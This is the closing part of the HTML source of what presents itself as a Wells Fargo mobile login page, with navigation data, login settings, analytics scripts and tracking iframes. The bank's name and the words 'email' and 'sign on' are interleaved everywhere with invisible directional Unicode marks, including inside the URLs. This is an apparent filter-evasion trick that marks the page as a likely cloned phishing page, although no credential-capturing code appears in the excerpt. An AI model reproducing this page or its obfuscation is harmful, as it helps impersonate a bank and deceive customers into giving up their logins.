Legal\x22,\x22navigationId\x22:\x22PRIVACY_COOKIES_SECURITY_LEGAL\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/privacy\-security\/\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Notice of Data Collection\x22,\x22navigationId\x22:\x22NOTICE_OF_DATA_COLLECTION\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/privacy\-security\/notice\-of\-data\-collection\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Report e‎‏m‎‏a‎‏i‎‏l‎‏ Fraud\x22,\x22navigationId\x22:\x22REPORT_e‎‏m‎‏a‎‏i‎‏l‎‏_FRAUD\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/privacy\-security\/fraud\/report\/phish\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Security Center\x22,\x22navigationId\x22:\x22SECURITY_CENTER\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/privacy\-security\/fraud\/\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Sitemap\x22,\x22navigationId\x22:\x22SITEMAP\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/sitemap\x22},{\x22eid\x22:\x22\x22,\x22label\x22:\x22Ad Choices\x22,\x22navigationId\x22:\x22AD_CHOICES\x22,\x22type\x22:\x22browser\x22,\x22url\x22:\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/privacy\-security\/privacy\/online\/#adchoices\x22}],\x22type\x22:\x22LINKS\x22}]}]}%w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary*\/'};
		window.mwfGlobals.pageData= '\/*w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary%{\x22loginParams\x22:{},\x22origin\x22:\x22cob\x22,\x22lob\x22:\x22COB\x22,\x22skipHeaderDivider\x22:\x22true\x22,\x22loginapp.mobile.wfappId\x22:\x22620934\x22,\x22nativeDevice\x22:false,\x22deviceType\x22:\x22Phone\x22,\x22ndClientId\x22:\x22w\-642409\x22,\x22ndJsUrl\x22:\x22https:\/\/connect.secure.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/ATADUN\/2.2\/w\/w\-642409\/sync\/js\/\x22,\x22showContinue\x22:\x22false\x22,\x22appdIsMobile\x22:true,\x22samlPrefix\x22:\x22\x22,\x22samlPrefixList\x22:[],\x22pageId\x22:\x22LOGIN\x22,\x22langPref\x22:\x22ENG\x22,\x22isMobile\x22:true,\x22inLangActive\x22:true,\x22isValidInlangPage\x22:true,\x22toggleUrl\x22:\x22\/auth\/login\/present?origin=cob\x26langPref=SPN\x22,\x22noscriptMessage\x22:\x22For your security, you must enable JavaScript to s‎‏i‎‏g‎‏n‎‏ o‎‏n‎ to your account. Please adjust your browser settings, or go to <a href=\\\x22https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/help\/faqs\/troubleshoot\-faqs\\\x22>Online Troubleshooting<\/a> for help.\x22,\x22language\x22:\x22EN\x22,\x22oamPasswordResetUrl\x22:\x22https:\/\/oam.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/oamo\/identity\/help\/passwordhelp\x22,\x22oamUsernameResetUrl\x22:\x22https:\/\/oam.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/oamo\/identity\/help\/usernamehelp\x22,\x22savedUsername\x22:false,\x22alppage\x22:false}%w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary*\/';

		window.utag_data = {
				'app_id': 'loginapp',
				'customer_type': '',
				'wfacookie': '45202104241008021794320504',
				'device_type': 'MOBILE',
				'environment': 'PROD',
				'tealium_js_path': 'https://static.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/tracking/secure-auth/utag.js',
				'mt_tag_path': 'https://static.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/mttag/',
				'page_id': 'LOGIN',
				'page_type': 'BROWSER',
				'gb_rubicon_host': 'https://rubicon.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com'
			}
	</script> 
  <script type="text/javascript" nonce="">
		(function(a, b, c, d) {
			a = 'https://static.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/tracking/secure-auth/utag.js';
			b = document;
			c = 'script';
			d = b.createElement(c);
			d.src = a;
			d.type = 'text/java' + c;
			d.async = true;
			a = b.getElementsByTagName(c)[0];
			if (a.src !== d.src) {
				a.parentNode.insertBefore(d, a);
			}
		})();
	</script> 
  <div id="app-modal-root">
   <div></div>
   <div></div>
   <div></div>
   <div></div>
  </div>
  <div id="sys-modal-root">
   <div></div>
  </div>
  <div id="aria-live-root">
   <div>
    <div role="region" aria-label="Status message history">
     <div class="visuallyHidden" aria-atomic="true" aria-live="polite"></div>
     <div class="visuallyHidden" aria-atomic="true" aria-live="polite"></div>
     <div class="visuallyHidden" aria-atomic="true" aria-live="assertive"></div>
     <div class="visuallyHidden" aria-atomic="true" aria-live="assertive"></div>
     <div class="visuallyHidden" aria-atomic="true" role="alert"></div>
     <div class="visuallyHidden" aria-atomic="true" role="alert"></div>
    </div>
   </div>
  </div> 
  <script type="text/javascript" nonce="">
try { 
	if (self === top) {
		var antiClickjack = document.getElementById("antiClickjack");
		antiClickjack.parentNode.removeChild(antiClickjack);
	} else {
		top.location = self.location;
	}
} catch(err) { 
} 

</script> 

  <div>
   <div tabindex="-1" id="accessibilityFocus" class="AccessibilityFocus__accessibilityFocus___cqXwn"></div>
  </div> 
  <img width="0" height="0" src="https://static.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/tracking/reporting/ttms.gif?capability=LiveRamp&amp;appId=loginapp&amp;wfaCookie=45202104241008021794320504&amp;error=timeout&amp;pageId=LOGIN&amp;pageType=BROWSER&amp;deviceType=MOBILE&amp;c_t="> 
  <iframe id="utag_3_iframe" height="1" width="1" style="display:none" src="//ad.doubleclick.net/ddm/activity/src=2549153;type=allv40;cat=all_a012;u1=45202104241008021794320504;u4=LOGIN;u5=n;u8=loginapp;u11=PROD;u23=MOBILE;ord=7353519229372.461?"></iframe> 
  <iframe title="pbtcxk" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe>
 </body>
</html>